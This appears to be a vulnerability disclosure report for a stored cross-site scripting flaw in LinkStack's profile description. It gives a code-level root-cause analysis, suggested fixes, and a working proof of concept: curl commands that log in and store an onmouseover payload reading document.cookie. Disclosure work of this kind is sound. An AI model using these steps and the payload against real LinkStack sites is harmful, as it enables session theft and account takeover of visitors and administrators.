# CVE Report: Stored Cross-Site Scripting via User Description in LinkStackOrg/LinkStack

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | LinkStack (LinkStackOrg/linkstack) |
| **Affected Version** | <= 4.8.6 (all versions) |
| **Vulnerability Type** | CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
| **Attack Vector** | Network (Remote) |
| **Authentication Required** | Low (any registered user) |
| **User Interaction** | Required (victim must visit attacker's link info page) |
| **CVSS 3.1 Base Score** | 8.7 (High) |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N |

## Description

LinkStack is a self-hosted, open-source link management platform (a Linktree alternative) built on Laravel 9. The application allows authenticated users to set a profile description via the `/studio/page` endpoint. The server-side sanitization uses PHP's `strip_tags()` with an allowlist of HTML tags including `<a>`. However, `strip_tags()` does not remove HTML attributes, allowing an attacker to inject JavaScript event handlers such as `onmouseover`, `onfocus`, or `onclick` inside allowed tags. The description is subsequently rendered without escaping using Blade's `{!! !!}` syntax on the link info page, resulting in stored cross-site scripting.

An attacker with a regular user account can store a malicious payload that executes JavaScript in the browser of any user (including administrators) who views the attacker's link info page.

## Root Cause

The `/studio/page` POST endpoint is handled by `UserController::editPage()`. At `app/Http/Controllers/UserController.php`, line 611, the description is sanitized with `strip_tags()` allowing a set of HTML tags:

```php
$pageDescription = strip_tags($request->pageDescription, '<a><p><strong><i><ul><ol><li><blockquote><h2><h3><h4>');
$pageDescription = preg_replace("/<a([^>]*)>/i", "<a $1 rel=\"noopener noreferrer nofollow\">", $pageDescription);
$pageDescription = strip_tags_except_allowed_protocols($pageDescription);
```

PHP's `strip_tags()` only removes disallowed tags — it does **not** strip attributes from allowed tags. An `<a>` tag with an `onmouseover` attribute passes through all three sanitization steps unchanged. The `strip_tags_except_allowed_protocols()` function at `app/Functions/functions.php:205` only validates the `href` protocol and does not inspect event handler attributes:

```php
function strip_tags_except_allowed_protocols($str) {
    preg_match_all('/<a[^>]+>(.*?)<\/a>/i', $str, $matches, PREG_SET_ORDER);
    foreach ($matches as $val) {
        if (!preg_match('/href=["\'](http:|https:|mailto:|tel:)[^"\']*["\']/', $val[0])) {
            $str = str_replace($val[0], $val[1], $str);
        }
    }
    return $str;
}
```

The sanitized description is saved to the `littlelink_description` column at line 623-625:

```php
User::where('id', $userId)->update([
    'littlelink_name' => $pageName,
    'littlelink_description' => $pageDescription,
    'name' => $name
]);
```

The description is then rendered **unescaped** on the link info page at `resources/views/linkinfo.blade.php`, line 108:

```blade
<p class="card-text mt-2">{!!$userData->littlelink_description!!}</p>
```

Blade's `{!! !!}` syntax outputs raw HTML without escaping, causing the injected event handler to execute in the victim's browser.

## Impact

An attacker with a regular user account can execute arbitrary JavaScript in the browser of any visitor to their link info page. This enables:

- **Session hijacking** — stealing session cookies to impersonate the victim, including administrators
- **Account takeover** — performing actions as the victim (changing email, password, or role)
- **Privilege escalation** — if an admin views the attacker's page, the attacker gains admin-level access
- **Phishing** — injecting fake login forms or redirecting to malicious sites
- **Worm propagation** — modifying other users' descriptions via stolen admin sessions to spread the payload

## Proof of Concept

### Step 1: Start LinkStack

```bash
docker run -d --name linkstack-test -p 3063:80 linkstackorg/linkstack:latest
```

Complete the initial setup and create a regular user account.

### Step 2: Login and obtain session cookies

Login as an Admin and click add a new user on the bottom. Create your test account and click on pending to verify the user.

<img width="1420" height="804" alt="image" src="https://github.com/user-attachments/assets/cf1a0f98-dbc2-4d3d-804c-7594b5064256" />

We will be using the test account to demonstrate the POC.

```bash
# Get CSRF token and session cookie
curl -s -c /tmp/ls_cookies.txt http://localhost:3063/login > /tmp/ls_login.html
TOKEN=$(strings /tmp/ls_login.html | grep '_token' | sed 's/.*value="//' | sed 's/".*//' | head -1)

# Login
curl -s -b /tmp/ls_cookies.txt -c /tmp/ls_cookies.txt \
  -X POST http://localhost:3063/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=${TOKEN}" \
  --data-urlencode "email=test2@test" \
  --data-urlencode "password=test" \
  -o /dev/null --max-redirs 0
```

### Step 3: Inject XSS payload via direct POST (bypassing CKEditor)

```bash
# Get CSRF token from studio page
curl -s -b /tmp/ls_cookies.txt -c /tmp/ls_cookies.txt \
  http://localhost:3063/studio/page > /tmp/ls_studio.html
TOKEN=$(strings /tmp/ls_studio.html | grep '_token' | sed 's/.*value="//' | sed 's/".*//' | head -1)

# POST the XSS payload directly to the server
curl -s -b /tmp/ls_cookies.txt -c /tmp/ls_cookies.txt \
  -X POST http://localhost:3063/studio/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=${TOKEN}" \
  --data-urlencode "littlelink_name=attacker" \
  --data-urlencode "pageName=attacker" \
  --data-urlencode "name=attacker" \
  --data-urlencode 'pageDescription=<a href="https://x" onmouseover="alert(document.cookie)">Hover over me</a>' \
  -o /dev/null --max-redirs 0
```

### Step 4: Verify the payload is stored

Query the database to confirm the event handler survived sanitization:

```
<a  href="https://x" onmouseover="alert(document.cookie)" rel="noopener noreferrer nofollow">Hover over me</a>
```

The `onmouseover` attribute is intact. The `rel` attribute was appended by the server but does not neutralize the payload.

### Step 5: Trigger the XSS

The attacker must have at least one link for the info page to render. After creating a link, visit:

You can get the link id by clicking edit its in the url

<img width="944" height="814" alt="image" src="https://github.com/user-attachments/assets/fbdbb296-b3a8-486a-83d8-229aebde804d" />


```
http://localhost:3063/info/{link_id}
```

Hover over "Hover over me" — a JavaScript alert displays the viewer's session cookies.


<img width="1380" height="656" alt="image" src="https://github.com/user-attachments/assets/3663d837-1540-47fd-9cc2-d88c686621b9" />


### Verified payload in database vs. rendered output

| Stage | Value |
|-------|-------|
| **Input** | `<a href="https://x" onmouseover="alert(document.cookie)">Hover over me</a>` |
| **After strip_tags()** | `<a href="https://x" onmouseover="alert(document.cookie)">Hover over me</a>` (unchanged — `<a>` is allowed, attributes preserved) |
| **After strip_tags_except_allowed_protocols()** | `<a href="https://x" onmouseover="alert(document.cookie)">Hover over me</a>` (unchanged — `href` uses `https:` protocol) |
| **Stored in DB** | `<a  href="https://x" onmouseover="alert(document.cookie)" rel="noopener noreferrer nofollow">Hover over me</a>` |
| **Rendered in HTML** | Raw, unescaped via `{!! !!}` — JavaScript executes on hover |

## Preconditions

- The attacker must have a registered account (registration is enabled by default)
- The attacker must create at least one link for the `/info/{link_id}` page to render without error
- The victim must visit the attacker's link info page and interact with the link (hover, focus, or click depending on payload)
- No special server configuration is required — the vulnerability exists in the default installation

## Additional Attack Surfaces

The same vulnerability class exists in other rendering paths:

1. **`resources/views/linkstack/elements/bio.blade.php:3`** — renders `littlelink_description` unescaped when `ALLOW_USER_HTML=true`
2. **`app/Http/Controllers/AdminController.php:337-353`** — the admin user-edit endpoint saves `littlelink_description` with **zero sanitization**, allowing `<script>` tags directly

## Recommended Fix

1. **Replace `{!! !!}` with `{{ }}`** for user-controlled data in all Blade templates, or use a proper HTML sanitization library such as [HTML Purifier](http://htmlpurifier.org/) that strips event handler attributes from allowed tags:

```php
use HTMLPurifier;
use HTMLPurifier_Config;

$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'a[href],p,strong,i,ul,ol,li,blockquote,h2,h3,h4');
$purifier = new HTMLPurifier($config);
$pageDescription = $purifier->purify($request->pageDescription);
```

2. **Use Blade's escaped output** on the info page:

```blade
<!-- Before (vulnerable) -->
<p class="card-text mt-2">{!!$userData->littlelink_description!!}</p>

<!-- After (safe) -->
<p class="card-text mt-2">{{ $userData->littlelink_description }}</p>
```

3. **Add sanitization to the admin edit-user endpoint** at `AdminController.php:337` — apply the same sanitization as the user-facing endpoint.

4. **Implement a Content-Security-Policy header** as defense-in-depth to mitigate XSS exploitation even if sanitization is bypassed.

## Timeline

| Date | Event |
|------|-------|
| 2026-04-09 | Vulnerability discovered |
| 2026-04-09 | PoC developed and tested against version 4.8.6 |

## References

- https://github.com/LinkStackOrg/LinkStack
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- PHP strip_tags limitations: https://www.php.net/manual/en/function.strip-tags.php
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
